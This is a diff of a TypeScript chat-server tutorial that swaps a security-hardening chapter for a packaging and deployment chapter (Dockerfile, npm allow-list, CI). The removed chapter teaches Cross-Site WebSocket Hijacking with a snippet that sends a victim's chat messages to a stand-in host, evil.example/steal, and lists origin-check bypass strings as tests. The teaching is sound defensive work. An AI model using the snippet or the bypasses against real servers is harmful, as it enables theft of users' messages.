@@ -1,248 +1,432 @@
-# Chapter 24 - Security & Hardening
+# Chapter 25 - Packaging & Deployment
 
-This server has had a serious vulnerability since Chapter 7. It has survived a chapter on authentication, a chapter on validation, and a chapter on the runtime, and none of them touched it - because it is not a bug in any of them. It is a thing the code never did.
+Everything between `npm run build` and a machine somebody else can reach.
 
-## The Same-Origin Policy does not apply to WebSockets
+## What this repository was about to publish
 
-Here is the attack. It is four lines, and the victim only has to **visit a page**.
-
-```javascript
-// on https://evil.example - a page the victim merely opens
-const ws = new WebSocket("ws://your-chat-server:8080");
-ws.onmessage = (e) => fetch("https://evil.example/steal", { method: "POST", body: e.data });
+```
+  119 files, 610kB unpacked
+    .ts source (incl. 11 tests):  55
+    .claude/ settings:            1
+    build tooling + configs:      6
 ```
 
-The browser opens that socket. Happily. **No preflight, no opt-in, no CORS.**
+Fifty-five TypeScript files - the entire source tree, tests and all - that nobody consuming this package can run. My editor's local settings. The Dockerfile, the CI workflow, both tsconfigs. All of it, to npm, forever - because `npm publish` ships **everything not excluded**, and nobody had ever told it what to exclude.
 
-The Same-Origin Policy - the thing that stops `evil.example` reading the response from your bank - was written before WebSockets existed and **was never extended to them**. `fetch()` is blocked. `new WebSocket()` is not.
+An **allow-list**, not a deny-list:
 
-`wss.handleUpgrade()` has accepted this since Chapter 7 without a word.
+```json
+"files": [
+  "dist/**/*.js",
+  "dist/**/*.d.ts",
+  "!dist/**/*.test.*",
+  "README.md"
+]
+```
 
-## What saved us was luck
+```
+  68 files, 297kB unpacked
+    test files: 0
+    .claude:    0
+```
 
-Our credential is a Bearer token that the client must send **deliberately**, inside a message. A drive-by socket from `evil.example` has no token, so it connects and then sits there being nobody.
+The distinction matters more than the numbers. A deny-list is a promise to think of everything in advance, forever, including the file you will add next March. An allow-list is a promise to think of what you meant - and the failure mode of forgetting is that something is *missing*, which you find out immediately, rather than *present*, which you find out from a security researcher.
 
-That is an accident, not a design. Had we used a **cookie** - the obvious, natural, widely-taught thing to do - the browser would have attached it **automatically**, to that connection, from that page, and `evil.example` would be reading the victim's chat in real time.
+## Two configs, because a test is code
 
-Chapter 22 chose a Bearer token for exactly this reason and said so at the time. It bought us a defence in depth we never actually built. **Depending on a defence you did not build is not depth, it is a coincidence you have not noticed yet.**
+Excluding tests from `tsconfig.json` stops 33 `.test.js` files landing in `dist/`. It also, silently, stops them being typechecked - and **code that does not typecheck is code that is lying to you.**
 
-## The fix is one line, and there is therefore no excuse
-
-```typescript
-if (!isOriginAllowed(outcome.request, this.originPolicy)) {
-  this.logger.warn("refused a WebSocket upgrade from a disallowed origin", {
-    client: conn.id,
-    origin: outcome.request.headers.get("origin") ?? "(none)",
-  });
-  conn.write("HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
-  conn.close();
-  return;
+```json
+// tsconfig.check.json
+{
+  "extends": "./tsconfig.json",
+  "compilerOptions": { "noEmit": true },
+  "include": ["src/**/*"],
+  "exclude": ["dist", "node_modules"]
 }
 ```
 
-`Origin` is the **only** defence a WebSocket has. The fact that the check is one line is not a reason to skip it; it is the reason there is no excuse for skipping it.
+`tsconfig.json` builds what ships. `tsconfig.check.json` checks everything and emits nothing, and it is what `npm run typecheck` actually runs. Proof that it works, obtained by breaking it on purpose:
 
-### Exact match, and only exact match
-
-```typescript
-return policy.allowed.includes(origin);
+```
+src/security.test.ts(91,7): error TS2322: Type 'string' is not assignable to type 'number'.
 ```
 
-The classic bug is `origin.endsWith("example.com")`, which cheerfully accepts `https://evil-example.com`. The classic *other* bug is `origin.startsWith("https://example.com")`, which accepts `https://example.com.evil.net`.
+## One command, four gates
 
-**Substring checks on a security boundary are how this goes wrong, every single time.** The tests say so out loud:
-
-```typescript
-it.each([
-  "https://chat.example.com.evil.net",   // beats startsWith
-  "https://evil-chat.example.com",       // beats a careless endsWith
-  "https://chat.example.com:9999",       // a different port is a different origin
-  "http://chat.example.com",             // a different scheme is a different origin
-  "null",                                 // a sandboxed iframe sends this
-])("refuses %o", (origin) => {
-  expect(isOriginAllowed(upgrade(origin), policy)).toBe(false);
-});
+```json
+"verify": "npm run typecheck && npm run test && npm run build",
+"prepublishOnly": "npm run verify"
 ```
 
-### And a missing Origin is allowed
+In that order, because that is the order they get *cheaper to fix* in. And `prepublishOnly` is npm's own hook: **a broken build cannot be published by accident, because the accident is the thing it exists to prevent.**
 
-This looks like a hole and it is not:
+## The container
 
-```typescript
-if (origin === undefined) {
-  return policy.allowNonBrowser;
-}
+```dockerfile
+FROM node:22-slim AS build
+COPY package.json package-lock.json ./
+RUN npm ci
+COPY src ./src
+RUN npm run verify
+RUN npm ci --omit=dev
+
+FROM node:22-slim AS run
+USER node
+COPY --from=build --chown=node:node /app/dist ./dist
 ```
 
-`nc`, `wscat`, a mobile app, a script - none of them send an `Origin`, and **none of them can be tricked into attaching somebody else's credentials.** The confused-deputy problem that `Origin` exists to solve is a *browser* problem: the browser is the deputy, and it is confused because it attaches credentials on the user's behalf without asking.
+Four things in there are load-bearing.
 
-An attacker who can set arbitrary headers is not using a browser. And if they are not using a browser, they already have the victim's machine, and `Origin` was never going to save anybody.
+**The manifest is copied before the source.** This is not tidiness, it is the layer cache. Docker reuses a layer when its inputs have not changed - so copying `src/` in *before* `npm ci` means every one-character edit re-downloads every dependency. Copy the manifest, install, *then* copy the source, and a typo re-runs the last two steps instead of the four-minute one.
 
-> **Tip**
->
-> `allowed: []` - refuse every browser - is the correct configuration for a server with no web UI, and it is worth knowing that it is *available*. Most origin checks in the wild are written as "allow my domain", when the truthful policy is often "allow nothing, because nothing should be opening this from a page."
+**`npm ci`, not `npm install`.** `ci` installs exactly the lockfile - the same bytes, every machine, forever - and fails loudly if `package.json` and the lockfile disagree. `install` is allowed to *resolve*, which means a build that worked this morning may quietly pick up a new patch release this afternoon. **A reproducible build is not reproducible if it is allowed to go shopping.**
 
-## Headers that turn off things you did not ask for
+**`npm run verify` runs inside the image.** It is tempting to build the artefact in CI and copy it in - and then the thing you tested is not the thing you shipped. The container is the unit. Test the unit.
 
-```typescript
-"Content-Security-Policy": [
-  "default-src 'none'",
-  "script-src 'unsafe-inline'",
-  "connect-src 'self' ws: wss:",
-  "frame-ancestors 'none'",
-  "base-uri 'none'",
-].join("; "),
-"X-Frame-Options": "DENY",
-"X-Content-Type-Options": "nosniff",
-"Referrer-Policy": "no-referrer",
-"Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=()",
+**`USER node`.** The `node` user ships with the image and is *not used by default*, which is a choice Docker made and you should not accept. A process that does not need to write to `/etc` should not be able to - and "did not need to" is not a defence available to a process running as uid 0. It also means the container cannot install packages, cannot bind below port 1024, and cannot chown its way out of trouble: all things a chat server has no business doing and an attacker very much does.
+
+And the second stage has **no compiler and no package manager.** An attacker with code execution in a container that has both has a workshop. One with neither has a JavaScript runtime and a chat server, and has to bring their own tools through a door we are watching.
+
+### `0.0.0.0`, not `127.0.0.1`
+
+```dockerfile
+ENV HOST=0.0.0.0
 ```
 
-None of these are magic. **Each one turns off a specific thing a browser would otherwise do on your behalf, and each one has a name because somebody was exploited by it first.**
+Inside a container, `127.0.0.1` means *this container*. A port published to the host connects to nothing at all, and this is the single most common reason a containerised server appears to start perfectly and then refuses every connection.
 
-- **CSP `default-src 'none'`** is the single most effective anti-XSS measure there is. Our page loads no external scripts, styles, fonts or images and never will, so say so - and then even if an attacker gets `<script src="//evil.example">` onto the page, the browser **refuses to fetch it**.
-- **`X-Frame-Options: DENY`**: clickjacking is somebody rendering your UI invisibly over a "click for a free thing" button. The fix is to refuse to be rendered inside anything.
-- **`nosniff`**: without it a browser *guesses* a response's type by sniffing its bytes, so a text file that happens to begin with `<script>` becomes a script.
+Chapter 20 made this an environment variable so it could be changed without touching code. Here is that decision being cashed.
 
-And they go on **every** response, not just the HTML one - because a JSON error is still something a browser will render if you point it at one, and `nosniff` matters most precisely where an attacker would like the browser to guess.
+## Folklore I had written down before I checked it
 
-> **Warning**
->
-> `script-src 'unsafe-inline'` is in there, and it is a real weakening - it is what permits the inline `<script>` that *is* our client. Removing it means a nonce or a hash regenerated on every deploy, which is a real thing to do and is Chapter 25's problem.
->
-> Leaving it **and knowing** is better than pretending. A security header you have copied from a blog post and do not understand is a comment, not a control.
+The Dockerfile says `CMD ["node", "dist/main.js"]`, not `npm start`, and I wrote a confident paragraph explaining why: **npm does not forward SIGTERM**, so a container running `npm start` never runs its shutdown handler, silently loses whatever is in the write queue, and is SIGKILLed ten seconds later.
 
-## Bounding what one stranger can take
+Chapter 12 built a shutdown that flushes to disk. Chapter 15 wired it to SIGTERM specifically so it would survive a deploy. So I tested it, because I wanted to watch it fail:
 
-Chapter 15 bounded what a single connection could make the server *hold*. It said nothing about how many connections one person may open - and a bound on each of a million things is not a bound.
+```bash
+$ npm start &
+$ kill -TERM <the npm pid>
 
-```typescript
-const refusal = this.limits.refuse(address);
-if (refusal !== undefined) {
-  this.logger.warn("refused a connection", { address, reason: refusal });
-  socket.destroy();
-  return;
-}
+{"level":"info","msg":"Shutting down"}
+{"level":"info","msg":"History flushed. Goodbye."}
 ```
 
-Refused **before** a `TcpClient` is constructed, before it is registered, before a buffer is allocated. The cheapest possible no.
+**It forwarded the signal.** npm 10 does this. The shutdown ran, the database flushed, nothing was lost. The folklore is out of date, and I had written the comment before I checked - which is exactly the habit this tutorial has spent twenty-five chapters arguing against.
 
-And the small thing that matters:
+The exec form is still right, for smaller and duller reasons: one process instead of three, faster start, PID 1 is the thing you want to be PID 1, and it does not depend on an npm version's signal handling staying correct forever.
 
-```typescript
-closed(address: string): void {
-  const count = (this.perAddress.get(address) ?? 1) - 1;
-  if (count <= 0) {
-    this.perAddress.delete(address);   // not set(address, 0)
-  }
-}
+But **check your own folklore.** Some of it has expired.
+
+## The warning that broke the log format
+
+Running the container's exact environment turned up something no test would have:
+
+```
+(node:1) ExperimentalWarning: SQLite is an experimental feature and might change at any time
+{"level":"info","time":"...","msg":"listening",...}
 ```
 
-A `Map` keyed by every IP that has ever connected is **a slow memory leak with a respectable job title.**
+`node:sqlite` prints that on **every boot**, and it is the first line the process emits. Chapter 20 went to some trouble to make the logs one-JSON-object-per-line, and line one is not JSON. A log pipeline that assumes it is will drop it, or mangle the next one, or fall over.
 
-## The catalogue of what was already right
+```dockerfile
+CMD ["node", "--disable-warning=ExperimentalWarning", "dist/main.js"]
+```
 
-It is worth listing, because a security chapter that only finds new holes is a security chapter that has not been reading:
+**Not `--no-warnings`.** That would also silence the deprecation notice telling you an API you depend on is going away, which is a warning you *want* shouted at you. Silence the one you have read and understood. Keep the ones you have not.
 
-| | since |
+## The health check is a liveness check
+
+```dockerfile
+HEALTHCHECK CMD node -e "fetch('http://127.0.0.1:8080/api/health').then(r => process.exit(r.ok ? 0 : 1))"
+```
+
+It asks whether the event loop is turning. It does **not** ask whether the database is happy, and that is deliberate.
+
+A health check that fails when a downstream dependency is down will take a perfectly healthy server out of rotation because *something else* broke - and then the load balancer will send its traffic to the remaining servers, which will also fail their checks, and you will have converted a degraded dependency into a total outage. **A liveness check answers "should you restart me", not "is everything fine".**
+
+## .dockerignore, and the two entries that matter
+
+```
+.env
+.git
+```
+
+**`.env`** would be baked into an image layer forever. Deleting it in a later `RUN` does not remove it - layers are immutable, and anybody with the image can read it back out. There is no un-committing a secret into a container image.
+
+**`.git`** is the entire history of the repository, including every secret anybody has ever committed and then removed. Shipping it is how a rotated key gets un-rotated.
+
+## What I did not verify, and will not pretend I did
+
+**Docker is not available in the environment I built this in. I have not built this image, and I have not run it.**
+
+That is an unusual thing to admit at the end of a tutorial whose entire method has been *run it and see*. It is also the only honest thing to write, and the alternative - a chapter that says "and it works!" about something I did not execute - would undo whatever the previous twenty-four chapters were worth.
+
+What I *did* verify is everything the container depends on, by running it directly:
+
+| | |
 |---|---|
-| Passwords hashed with scrypt, per-user salt | Ch 17 |
-| Constant-time comparison of signatures and hashes | Ch 17 |
-| `alg:none` JWT forgery refused | Ch 17 |
-| Account enumeration closed - same answer, same *timing* | Ch 17 |
-| Authorization read from the account, never from the token | Ch 17 |
-| SQL injection impossible: bound parameters everywhere | Ch 21 |
-| Every message validated, every field bounded | Ch 14 |
-| Unbounded read buffer closed | Ch 15 |
-| Unbounded write queue closed | Ch 15 |
-| Internal errors never leak to a client | Ch 10 |
-| Secrets redacted from logs at the sink | Ch 20 |
-| Bearer token, not a cookie - no CSRF | Ch 22 |
-| Rate limiting | Ch 17 |
+| `npm run verify` - the `RUN` step in the build stage | ✓ passes |
+| `dist/main.js` exists and is the `CMD` target | ✓ |
+| the exact `HEALTHCHECK` command | ✓ exits 0 |
+| `HOST=0.0.0.0` binds and answers | ✓ 200 |
+| `DATA_DIR` - the volume mount point - is honoured | ✓ `chat.db` written there |
+| `LOG_FORMAT=json` produces parseable line 1 | ✓ (after the warning fix) |
+| `NODE_ENV=production` with no `JWT_SECRET` refuses to start | ✓ exit 1 |
+| SIGTERM flushes the database before exit | ✓ "History flushed. Goodbye." |
+| the published package contains no tests, docs, or settings | ✓ 68 files |
 
-## And what is still wrong
-
-An honest chapter says this part too.
-
-1. **There is no TLS.** Everything above is defending a plaintext connection. `ws://` and `http://` mean every password, every token and every message crosses the network in the clear. In production this server sits behind nginx, Caddy, or a load balancer that terminates TLS - which is the normal and correct arrangement, and it means the *deployment* is where this gets fixed, not the code. Chapter 25.
-2. **The timing side channel Chapter 19 admitted to.** Replace `timingSafeEqual` with `===` and all 111 tests still pass. That is still true.
-3. **Tokens cannot be revoked.** A stolen token is valid until it expires. Chapter 17's exercise 4 asks you to fix it and points out that you will have reinvented a session table.
-4. **`script-src 'unsafe-inline'`**, above.
+The Dockerfile is a **hypothesis** built out of verified parts. Run `docker build .` and find out. If it is wrong, it will be wrong in a way that takes ninety seconds to fix - and you will know, which is the whole point.
 
 ## Putting It Together
 
-`src/security.ts` shuts the origin hole that had been open since Chapter 7. It is on the `chapter24` branch.
+`Dockerfile`
 
-The CSWSH defence, and the only defence a WebSocket has. Exact match, never a substring - the comment names the two classic bypasses:
+```dockerfile
+# A container that ships what runs, and nothing else.
+#
+# Two stages. The first one has TypeScript, vitest, the source, the tests, and
+# every devDependency; the second one has none of it. What crosses between them is
+# `dist/` and the production node_modules, and nothing else can - not because we
+# remembered to delete it, but because it was never in the final image to delete.
+#
+# The security argument is the whole point. An attacker who gets code execution in
+# a container with a compiler and a package manager has a workshop. One with
+# neither has a JavaScript runtime and a chat server, and has to bring their own
+# tools through a door we are watching.
 
-```typescript
-export function isOriginAllowed(request: HttpRequest, policy: OriginPolicy): boolean {
-  const origin = request.headers.get("origin");
+# --- build ---------------------------------------------------------------
+FROM node:22-slim AS build
 
-  if (origin === undefined) {
-    return policy.allowNonBrowser;
-  }
+WORKDIR /app
 
-  // Exact match, and only exact match.
-  //
-  // The classic bug here is `origin.endsWith("example.com")`, which cheerfully
-  // accepts `https://evil-example.com` and `https://example.com.evil.net`. The
-  // classic *other* bug is `origin.startsWith("https://example.com")`, which
-  // accepts `https://example.com.evil.net` too. Substring checks on a security
+# package.json and the lockfile first, *before* the source.
+#
+# This is not tidiness, it is the layer cache. Docker reuses a layer when its
+# inputs have not changed, so copying the source in before installing means every
+# one-character edit re-downloads every dependency. Copy the manifest, install,
+# and then copy the source, and a change to a .ts file re-runs the last two steps
+# and not the four-minute one.
+COPY package.json package-lock.json ./
+
+# `npm ci`, not `npm install`. `ci` installs exactly the lockfile - the same bytes
+# every time, on every machine, forever - and fails loudly if package.json and the
+# lockfile disagree. `install` is allowed to *resolve*, which means a build that
+# worked this morning may quietly pick up a new patch release this afternoon, and
+# a reproducible build is not reproducible if it is allowed to shop.
+RUN npm ci
+
+COPY tsconfig.json tsconfig.check.json ./
+COPY src ./src
+
+# Typecheck, test, build. In the image.
+#
+# It is tempting to build the artefact in CI and copy it in - and then the thing
+# you tested is not the thing you shipped. The container is the unit; test the
+# unit.
+RUN npm run verify
+
+# Now throw away everything that is not needed to run. `--omit=dev` re-resolves
+# node_modules with the devDependencies left out: no TypeScript, no vitest, no
+# esbuild.
+RUN npm ci --omit=dev
+
+# --- run -----------------------------------------------------------------
+FROM node:22-slim AS run
+
+# Not root.
+#
+# The `node` user ships with the image and it is not used by default, which is a
+# choice Docker made and you should not accept. A process that does not need to
+# write to /etc should not be able to, and "did not need to" is not a defence
+# available to a process running as uid 0.
+#
+# It also means the container cannot install packages, cannot bind to a port below
+# 1024, and cannot chown its way out of trouble - all of which are things a chat
+# server has no business doing and an attacker very much does.
+USER node
+WORKDIR /home/node/app
+
+ENV NODE_ENV=production
+
+# Logs go to stdout, as JSON, because `defaultFormat()` sees that stdout is not a
+# TTY and decides for itself. Chapter 20 built that so nobody would have to
+# remember this line - and here is the line not being needed.
+ENV LOG_FORMAT=json
+
+# The data directory is a volume. A container is *cattle* - you kill it and start
+# another - and anything you care about that lives inside its filesystem dies with
+# it. The SQLite file must be somewhere that outlives the container that wrote it.
+ENV DATA_DIR=/home/node/app/data
+VOLUME ["/home/node/app/data"]
+
+COPY --from=build --chown=node:node /app/node_modules ./node_modules
+COPY --from=build --chown=node:node /app/dist ./dist
+COPY --from=build --chown=node:node /app/package.json ./package.json
+
+EXPOSE 8080
+
+# 0.0.0.0, not 127.0.0.1.
+#
+# Inside a container, 127.0.0.1 means "this container", and a port published to
+# the host will connect to nothing at all. It is the single most common reason a
+# containerised server appears to start perfectly and refuse every connection.
+ENV HOST=0.0.0.0
+ENV PORT=8080
+
+# The health check the load balancer will use, and the one Chapter 15 built.
+#
+# It is a *liveness* check: it asks whether the event loop is turning, not whether
+# the database is happy. A health check that fails when a downstream dependency is
+# down will take a perfectly healthy server out of rotation because something else
+# broke, and then the retries will take out the rest of them.
+HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
+  CMD node -e "fetch('http://127.0.0.1:8080/api/health').then(r => process.exit(r.ok ? 0 : 1)).catch(() => process.exit(1))"
+
+# `node dist/main.js`, not `npm start` - and the usual reason given for this is
+# now wrong, which is worth more than the advice.
+#
+# The folklore says npm does not forward SIGTERM, so a container running
+# `npm start` never runs its shutdown handler, silently loses whatever was in the
+# write queue, and gets SIGKILLed ten seconds later. That *was* true. I tested it,
+# because Chapter 12 built a shutdown that flushes to disk and Chapter 15 wired it
+# to SIGTERM precisely so it would survive a deploy, and I wanted to watch it work:
+#
+#     $ npm start &        $ kill -TERM <npm>
+#     {"level":"info","msg":"Shutting down"}
+#     {"level":"info","msg":"History flushed. Goodbye."}
+#
+# npm 10 forwards the signal. The shutdown ran. The folklore is out of date, and I
+# had written the comment before I checked, which is exactly the habit this tutorial
+# has spent twenty-five chapters arguing against.
+#
+# The exec form is still right, for smaller and duller reasons: it is one process
+# instead of three, it starts faster, PID 1 is the thing you actually want to be
+# PID 1, and it does not depend on an npm version's signal handling being correct
+# forever. But *check your own folklore*. Some of it expired.
+#
+# --disable-warning=ExperimentalWarning, and only that one.
+#
+# node:sqlite prints an ExperimentalWarning on every boot, to stderr, and it is the
+# first line the process emits. Chapter 20 went to some trouble to make the logs
+# machine-parseable - one JSON object per line - and then line one is
+# `(node:1) ExperimentalWarning: SQLite is an experimental feature`, which is not
+# JSON, and a log pipeline that assumes it is will drop or mangle it.
+#
+# Not `--no-warnings`. That would also silence the deprecation notice telling you
+# an API you depend on is going away, which is a warning you want to be shouted at
+# about. Silence the one you have read and understood; keep the ones you have not.
+CMD ["node", "--disable-warning=ExperimentalWarning", "dist/main.js"]
 ```
 
-> **Tip**
->
-> The complete, runnable file is `src/security.ts` on the `chapter24` branch. You are not meant to paste it wholesale - build your own as you follow along, and use the reference to check yourself.
+`.github/workflows/ci.yml`
+
+```yaml
+# The gate.
+#
+# Nothing here is clever. Its whole job is to run, on somebody else's machine, the
+# thing that passed on yours - and to fail before a broken commit reaches a branch
+# anybody else pulls.
+name: ci
+
+on:
+  push:
+    branches: ["**"]
+  pull_request:
+
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          # The version the Dockerfile runs and the version `engines` requires.
+          # A CI that tests on a Node the production image does not have is a CI
+          # that tells you about a different program.
+          node-version: 22
+          cache: npm
+
+      # `ci`, not `install`. Exactly the lockfile, every time - and it fails if
+      # package.json and package-lock.json disagree, which is the single most
+      # common way a green CI ships a red container.
+      - run: npm ci
+
+      # Typecheck (including the tests, via tsconfig.check.json), then the tests,
+      # then the build. In that order, because that is the order they get faster to
+      # fix in.
+      - run: npm run verify
+
+      # The package as it would actually be published. This is the step that would
+      # have caught the entire test and source tree being shipped
+      # to npm, which is exactly what this repository was doing until Chapter 25.
+      - name: check what would be published
+        run: |
+          npm pack --dry-run
+          test "$(npm pack --dry-run --json | jq '[.[0].files[] | select(.path | test("\\.test\\."))] | length')" -eq 0 \
+            || (echo "test files in the package" && exit 1)
+
+  container:
+    runs-on: ubuntu-latest
+    needs: verify
+
+    steps:
+      - uses: actions/checkout@v4
+
+      # Build the image. The Dockerfile runs `npm run verify` inside itself, so
+      # this tests the artefact that ships rather than one that resembles it.
+      - run: docker build -t chat-server:ci .
+
+      # And then actually start it, because an image that builds is not an image
+      # that runs. This is the cheapest possible smoke test and it catches the
+      # embarrassing ones: a missing file, a bad CMD, a server that binds to
+      # 127.0.0.1 inside a container and answers nobody.
+      - name: it starts, and it answers
+        run: |
+          docker run -d --name chat -p 8080:8080 \
+            -e JWT_SECRET=ci-secret-not-a-real-one \
+            chat-server:ci
+          for i in $(seq 1 20); do
+            curl -sf localhost:8080/api/health && break || sleep 1
+          done
+          curl -sf localhost:8080/api/health | jq -e '.pid and .rooms'
+          docker rm -f chat
+```
 
 ## Try It
 
 ```bash
-npm run build && npm start
-curl -sD- -o /dev/null localhost:8080/ | grep -iE '^(content-security|x-frame|x-content)'
+npm run verify        # typecheck (incl. tests), test, build
+npm pack --dry-run    # exactly what would be published
 ```
-
-```
-Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; ...
-X-Frame-Options: DENY
-X-Content-Type-Options: nosniff
-```
-
-The browser page still works, because the server allows the origin it serves that page from - it computes that for itself from `--host` and `--port`. And for anything else:
 
 ```bash
-ALLOWED_ORIGINS=https://chat.example.com npm start
+docker build -t chat-server .
+docker run -p 8080:8080 -e JWT_SECRET=$(openssl rand -hex 32) -v chat-data:/home/node/app/data chat-server
 ```
 
-Then confirm the hole is shut, which is a job for the test suite rather than a script that looks like an exploit kit:
-
-```bash
-npx vitest run src/security.test.ts
-```
-
-```
- ✓ Cross-Site WebSocket Hijacking > refuses an upgrade from another website
- ✓ Cross-Site WebSocket Hijacking > refuses 'https://chat.example.com.evil.net'
- ✓ Cross-Site WebSocket Hijacking > refuses 'https://evil-chat.example.com'
- ✓ Cross-Site WebSocket Hijacking > allows a non-browser client with no Origin at all
-```
+And in front of it, in production, the thing this chapter does **not** contain: something that terminates TLS. nginx, Caddy, a cloud load balancer - anything. Chapter 24 said it and it is still true: **everything in this tutorial is defending a plaintext connection**, and `ws://` means every password crosses the network in the clear. TLS belongs at the edge, and the edge is not this program.
 
 ## Exercise
 
-1. Change the origin check to `origin.endsWith("example.com")`. Every test in `security.test.ts` that matters goes red, and it names the domain that just got in. Read it.
-2. Set `allowedOrigins: []` and open the browser page. It breaks - and the error in the console is the *whole* lesson about what that header is for.
-3. Remove `'unsafe-inline'` from the CSP. The page stops working. Now fix it properly: generate a nonce per response, put it on the `<script>` tag and in the header. What has to change about how the page is served?
-4. Set `maxConnectionsPerAddress` to 1 and open two browser tabs. Now put the server behind a load balancer where every connection appears to come from one IP. What did you just do to all of your users, and what is the actual fix?
-5. Find every place in this codebase where an attacker controls a string that ends up in a filename, a query, a header, or a log line. There are more than you think, and the ones that are safe are safe for a *reason*. Write the reason down.
+1. Delete `"files"` from `package.json` and run `npm pack --dry-run`. Read the list. That is what you were about to publish under your own name.
+2. Move `COPY src ./src` above `RUN npm ci` and time two builds with a one-character change between them. That is what the layer cache is worth.
+3. Remove `USER node`. Now `docker exec` into the container and `npm install` something. That is what an attacker with code execution just got.
+4. Make `/api/health` fail when the database is unreachable. Now take the database down and watch every replica get pulled out of rotation at once. Put it back.
+5. `--disable-warning=ExperimentalWarning` silences a warning that is telling you something true: `node:sqlite` is experimental and its API may change. Write down what you will do when it does - and notice that Chapter 21's `MessageStore` interface is most of the answer.
 
 ## What's Next
 
-The hole is shut, the headers are set, the connections are bounded, and the things that were already right have been counted.
+Nothing. This is the end of the tutorial.
 
-What is left is everything between `npm run build` and a machine somebody else can reach: TLS, a container that does not run as root, a health check a load balancer can use, and a build that fails before a broken commit is ever deployed.
+The server is a program with a shape. One port, three protocols. A wire format that is checked at compile time and validated at runtime from a single schema. An error boundary that has never once let a stranger's typo take the process down. History in a real database, with an index, and migrations that refuse to run backwards. Passwords that are slow on purpose, tokens that cannot be forged, and a door that is shut - including the one that had been open since Chapter 7. A heartbeat that notices the dead. Logs a machine can read and that do not contain anybody's password. A hundred and eleven tests, two of which exist because the tutorial shipped the bug first and had to go back for it.
 
-Next, and last: **packaging and deployment.**
+It also has four things wrong with it that Chapter 24 lists by name, a timing side-channel the test suite cannot see, and a Dockerfile I have not run.
+
+That is not a failure of the method. **That is the method.** The measure of a codebase is not that it has no problems; it is whether it can tell you what they are.
 
 ---
 
-Written for this repository. Upstream: <https://purphoros.com/howto/typescript/security>
+Written for this repository. Upstream: <https://purphoros.com/howto/typescript/deployment>
